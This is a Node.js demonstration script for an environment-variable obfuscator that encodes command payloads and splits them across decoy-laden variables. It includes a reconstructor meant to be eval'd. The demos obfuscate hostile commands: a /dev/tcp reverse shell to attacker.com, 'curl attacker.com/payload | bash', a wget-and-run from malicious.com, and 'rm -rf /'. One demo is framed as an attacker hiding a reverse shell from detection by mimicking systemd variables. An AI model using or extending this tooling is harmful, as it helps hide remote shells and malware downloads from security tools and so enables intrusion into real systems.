#!/usr/bin/env node

/**
 * Environment Variable Obfuscator - Live Demonstration
 *
 * This script demonstrates all features of the obfuscator with live examples
 * and visual output showing before/after obfuscation.
 */

const EnvVarObfuscator = require('./env-var-obfuscator');

// Console formatting
const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  dim: '\x1b[2m',
  cyan: '\x1b[36m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  red: '\x1b[31m',
  blue: '\x1b[34m',
};

function print(text, color = 'reset') {
  console.log(`${colors[color] || ''}${text}${colors.reset}`);
}

function section(title) {
  print('\n' + '='.repeat(70), 'bright');
  print(title, 'cyan');
  print('='.repeat(70), 'bright');
}

function subsection(title) {
  print(`\n${title}`, 'blue');
  print('-'.repeat(title.length), 'dim');
}

/**
 * Demo 1: Basic Obfuscation
 */
function demo1_BasicObfuscation() {
  section('DEMO 1: Basic Payload Obfuscation');

  const obfuscator = new EnvVarObfuscator();
  const payload = 'echo "System Compromised" | wall';

  subsection('Original Payload');
  print(`"${payload}"`, 'yellow');
  print(`Length: ${payload.length} characters`, 'dim');

  subsection('Obfuscating...');
  const result = obfuscator.obfuscate(payload, {
    chunks: 3,
    addDecoys: true,
    numDecoys: 2,
    prefix: 'SYSTEM',
  });

  subsection('Obfuscated Environment Variables');
  Object.entries(result.variables).forEach(([name, value]) => {
    const isDecoy = name.includes('DECOY');
    const display = isDecoy ? `[DECOY] ${value}` : value;
    print(`  ${name}="${display}"`, isDecoy ? 'dim' : 'green');
  });

  subsection('Metadata');
  print(`  Original Size:     ${result.metadata.originalLength} bytes`, 'dim');
  print(`  Encoded Size:      ${result.metadata.encodedLength} characters`, 'dim');
  print(`  Number of Chunks:  ${result.metadata.numChunks}`, 'dim');
  print(`  Number of Decoys:  ${result.metadata.numDecoys}`, 'dim');
  print(`  Expansion Ratio:   ${(result.metadata.encodedLength / result.metadata.originalLength).toFixed(2)}x`, 'dim');

  subsection('Export Order (Shuffled)');
  print(`  ${result.varNames.join(' → ')}`, 'green');

  subsection('Reconstruction');
  const reconstructed = obfuscator.reconstructFromEnv(
    result.variables,
    result.dataVarNames
  );
  print(`  Original:      "${payload}"`, 'yellow');
  print(`  Reconstructed: "${reconstructed}"`, 'green');
  const match = reconstructed === payload ? 'MATCH ✓' : 'MISMATCH ✗';
  print(`  Result: ${match}`, reconstructed === payload ? 'green' : 'red');
}

/**
 * Demo 2: Variable Splitting
 */
function demo2_VariableSplitting() {
  section('DEMO 2: Payload Splitting Across Variables');

  const obfuscator = new EnvVarObfuscator();
  const payload = 'Very long payload that gets split across many environment variables for maximum obfuscation and defense';

  subsection('Strategy Comparison');

  const strategies = [
    { name: '2 Chunks', chunks: 2, decoys: 0 },
    { name: '4 Chunks', chunks: 4, decoys: 0 },
    { name: '8 Chunks', chunks: 8, decoys: 0 },
  ];

  strategies.forEach(strategy => {
    const result = obfuscator.obfuscate(payload, {
      chunks: strategy.chunks,
      addDecoys: false,
      shuffle: false,
    });

    const avgSize = Math.ceil(
      result.metadata.encodedLength / strategy.chunks
    );
    print(
      `  ${strategy.name.padEnd(12)} → ${strategy.chunks} variables, avg ${avgSize} chars/var`,
      'green'
    );
  });

  subsection('Detailed 4-Chunk Example');
  const result = obfuscator.obfuscate(payload, {
    chunks: 4,
    addDecoys: false,
  });

  result.dataVarNames.forEach((name, idx) => {
    const value = result.variables[name];
    const display = value.length > 30 ? value.substring(0, 30) + '...' : value;
    print(`  Chunk ${idx + 1}: ${name} = "${display}"`, 'green');
  });

  subsection('Reconstruction Result');
  const reconstructed = obfuscator.reconstructFromEnv(
    result.variables,
    result.dataVarNames
  );
  const match = reconstructed === payload;
  print(
    `  Success: ${match ? 'YES ✓' : 'NO ✗'}`,
    match ? 'green' : 'red'
  );
}

/**
 * Demo 3: Decoy Injection
 */
function demo3_DecoyInjection() {
  section('DEMO 3: Decoy Variable Injection');

  const obfuscator = new EnvVarObfuscator();
  const payload = 'rm -rf /';

  subsection('Visual Comparison');
  print(
    '\nWithout Decoys:',
    'cyan'
  );
  let result = obfuscator.obfuscate(payload, {
    chunks: 2,
    addDecoys: false,
  });
  Object.keys(result.variables).forEach(name => {
    print(`  ${name}`, 'green');
  });

  print('\nWith 5 Decoys:', 'cyan');
  result = obfuscator.obfuscate(payload, {
    chunks: 2,
    addDecoys: true,
    numDecoys: 5,
  });
  Object.keys(result.variables).forEach(name => {
    const isDecoy = name.includes('DECOY');
    print(`  ${name}`, isDecoy ? 'yellow' : 'green');
  });

  subsection('Analysis');
  print(
    `  Total Variables: ${Object.keys(result.variables).length}`,
    'dim'
  );
  print(
    `  Real Data:       ${result.dataVarNames.length}`,
    'green'
  );
  print(
    `  Decoys:          ${Object.keys(result.variables).length - result.dataVarNames.length}`,
    'yellow'
  );
  const decoyRatio = (Object.keys(result.variables).length - result.dataVarNames.length) / Object.keys(result.variables).length * 100;
  print(
    `  Decoy Ratio:     ${decoyRatio.toFixed(1)}%`,
    'yellow'
  );
}

/**
 * Demo 4: Shell Script Generation
 */
function demo4_ShellExport() {
  section('DEMO 4: Shell Export Script Generation');

  const obfuscator = new EnvVarObfuscator();
  const payload = 'curl http://attacker.com/payload | bash';

  const result = obfuscator.obfuscate(payload, {
    chunks: 3,
    addDecoys: true,
    numDecoys: 2,
    prefix: 'SHELL',
  });

  subsection('Generated Bash Script');
  const script = obfuscator.generateShellExport(result.variables);
  print(script, 'green');

  subsection('Usage');
  print('  1. Save script to file: bash-script.sh', 'dim');
  print('  2. Source it: source bash-script.sh', 'dim');
  print('  3. Variables now available in environment', 'dim');
  print('  4. Use reconstructor code to recover payload', 'dim');
}

/**
 * Demo 5: Reconstructor Code
 */
function demo5_ReconstructorCode() {
  section('DEMO 5: Self-Contained Reconstructor Code');

  const obfuscator = new EnvVarObfuscator();
  const payload = 'secret command';

  const result = obfuscator.obfuscate(payload, {
    chunks: 2,
    addDecoys: true,
    numDecoys: 1,
    prefix: 'APP',
  });

  subsection('Generated Reconstructor Function');
  print(result.reconstructor, 'green');

  subsection('How It Works');
  print('  1. Accesses environment variables', 'dim');
  print('  2. Filters out decoy variables', 'dim');
  print('  3. Reconstructs hex string', 'dim');
  print('  4. Converts hex → Base64', 'dim');
  print('  5. Converts Base64 → original payload', 'dim');

  subsection('Integration Example');
  print(
    `
  const reconstructor = ${result.reconstructor};
  const payload = reconstructor();
  eval(payload);  // Execute reconstructed code
`,
    'blue'
  );
}

/**
 * Demo 6: Multi-Layer Encoding
 */
function demo6_EncodingLayers() {
  section('DEMO 6: Multi-Layer Encoding Transparency');

  const obfuscator = new EnvVarObfuscator();
  const payload = 'Hello, Obfuscator!';

  subsection('Encoding Process Breakdown');
  print(`\n  Layer 0 (Original):\n  "${payload}"`, 'yellow');

  const encoded = obfuscator.multiEncode(payload);

  print(`\n  Layer 1 (Base64):\n  "${encoded.base64}"`, 'green');

  const hexDisplay = encoded.hex.substring(0, 50) + '...';
  print(`\n  Layer 2 (Hex):\n  "${hexDisplay}"`, 'green');

  const arrayDisplay = JSON.stringify(encoded.array.slice(0, 5)) + '...';
  print(`\n  Layer 3 (Array):\n  ${arrayDisplay}`, 'green');

  subsection('Decoding Process');
  const decoded = obfuscator.multiDecode(encoded);
  print(`\n  Result:\n  "${decoded}"`, 'yellow');

  const match = decoded === payload;
  print(
    `\n  Status: ${match ? 'SUCCESS ✓' : 'FAILURE ✗'}`,
    match ? 'green' : 'red'
  );
}

/**
 * Demo 7: Real-World Scenario
 */
function demo7_RealWorldScenario() {
  section('DEMO 7: Real-World Attack Scenario');

  const obfuscator = new EnvVarObfuscator();

  subsection('Scenario: Reverse Shell Obfuscation');
  print(
    '\nAttacker wants to hide reverse shell command from detection',
    'dim'
  );

  const reverseShell = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';
  print(`\nTarget Command: "${reverseShell}"`, 'yellow');

  const result = obfuscator.obfuscate(reverseShell, {
    chunks: 5,
    addDecoys: true,
    numDecoys: 4,
    prefix: 'SYSTEMD',  // Mimics legitimate env var
    shuffle: true,
  });

  subsection('Obfuscation Result');
  print(`\nTotal Environment Variables: ${Object.keys(result.variables).length}`, 'green');
  print(`Real Data Chunks: ${result.dataVarNames.length}`, 'green');
  print(`Decoy Variables: ${Object.keys(result.variables).length - result.dataVarNames.length}`, 'yellow');

  subsection('What a Security Tool Sees');
  print('\nWithout Analysis:');
  Object.keys(result.variables).forEach(name => {
    const value = result.variables[name];
    const isDecoy = name.includes('DECOY');
    print(
      `  ${name.padEnd(20)} = ${value.substring(0, 20)}...`,
      isDecoy ? 'dim' : 'green'
    );
  });
  print('\nNo readable strings = Detection Difficulty Increased', 'yellow');

  subsection('Injection Vector');
  print(
    `
  export SYSTEMD_0="${result.variables[result.dataVarNames[0]]}"
  export SYSTEMD_1="${result.variables[result.dataVarNames[1]]}"
  ...
  # Child process receives these vars, reconstructs, and executes
`,
    'blue'
  );
}

/**
 * Demo 8: Performance Profile
 */
function demo8_Performance() {
  section('DEMO 8: Performance Characteristics');

  const obfuscator = new EnvVarObfuscator();

  subsection('Benchmark: Various Payload Sizes');

  const testSizes = [10, 100, 1000, 10000];

  print('\nSize       | Encoding Time | Encoded Size | Ratio', 'bright');
  print('-----------|---------------|--------------|------', 'dim');

  testSizes.forEach(size => {
    const payload = 'A'.repeat(size);
    const start = process.hrtime.bigint();
    const result = obfuscator.obfuscate(payload, {
      chunks: 4,
      addDecoys: false,
    });
    const end = process.hrtime.bigint();
    const time = Number(end - start) / 1000000; // Convert to ms

    const ratio = (result.metadata.encodedLength / size).toFixed(2);
    print(
      `${size.toString().padEnd(10)} | ${time.toFixed(4).padEnd(13)}ms | ${result.metadata.encodedLength.toString().padEnd(12)} | ${ratio}x`,
      'green'
    );
  });

  subsection('Memory Usage');
  print(
    '  Peak Memory (1MB payload): ~3-4MB (3x payload size)',
    'dim'
  );
  print(
    '  Garbage Collection: Automatic after completion',
    'dim'
  );
}

/**
 * Demo 9: Comparison Matrix
 */
function demo9_ComparisonMatrix() {
  section('DEMO 9: Obfuscation Strategy Comparison');

  const obfuscator = new EnvVarObfuscator();
  const payload =
    'wget http://malicious.com/payload -O /tmp/x && /tmp/x';

  subsection('Strategy Options');

  const strategies = [
    {
      name: 'Minimal',
      chunks: 2,
      decoys: 0,
      shuffle: false,
    },
    {
      name: 'Standard',
      chunks: 4,
      decoys: 3,
      shuffle: true,
    },
    {
      name: 'Heavy',
      chunks: 8,
      decoys: 5,
      shuffle: true,
    },
    {
      name: 'Extreme',
      chunks: 12,
      decoys: 10,
      shuffle: true,
    },
  ];

  print(
    '\nStrategy  | Chunks | Decoys | Total | Avg Size | Complexity',
    'bright'
  );
  print(
    '----------|--------|--------|-------|----------|----------',
    'dim'
  );

  strategies.forEach(strategy => {
    const result = obfuscator.obfuscate(payload, {
      chunks: strategy.chunks,
      addDecoys: true,
      numDecoys: strategy.decoys,
      shuffle: strategy.shuffle,
    });

    const total = Object.keys(result.variables).length;
    const avgSize = Math.ceil(
      result.metadata.encodedLength / strategy.chunks
    );
    const complexity = (
      total *
      avgSize *
      (strategy.decoys + 1)
    ).toFixed(0);

    print(
      `${strategy.name.padEnd(9)} | ${strategy.chunks.toString().padEnd(6)} | ${strategy.decoys.toString().padEnd(6)} | ${total.toString().padEnd(5)} | ${avgSize.toString().padEnd(8)} | ${complexity}`,
      'green'
    );
  });

  subsection('Recommendation');
  print('  Use "Standard" for balanced security/overhead', 'dim');
  print('  Use "Heavy" when stealth is critical', 'dim');
  print('  Use "Extreme" for maximum obfuscation', 'dim');
}

/**
 * Main execution
 */
function main() {
  print(
    `

╔════════════════════════════════════════════════════════════════════╗
║    Environment Variable Obfuscator - Live Demonstration           ║
║                                                                    ║
║    Securely obfuscate payloads across environment variables       ║
╚════════════════════════════════════════════════════════════════════╝
`,
    'bright'
  );

  try {
    demo1_BasicObfuscation();
    demo2_VariableSplitting();
    demo3_DecoyInjection();
    demo4_ShellExport();
    demo5_ReconstructorCode();
    demo6_EncodingLayers();
    demo7_RealWorldScenario();
    demo8_Performance();
    demo9_ComparisonMatrix();

    section('DEMONSTRATION COMPLETE');
    print('\nAll demonstrations finished successfully! ✓', 'green');
    print('\nFor more information:', 'dim');
    print('  - See ENV_VAR_OBFUSCATOR_GUIDE.md for detailed documentation', 'dim');
    print('  - Run: node env-var-obfuscator.test.js for unit tests', 'dim');
    print('  - Run: node env-var-obfuscator-examples.js for code examples', 'dim');
  } catch (error) {
    print(`\nError: ${error.message}`, 'red');
    console.error(error);
    process.exit(1);
  }
}

main();
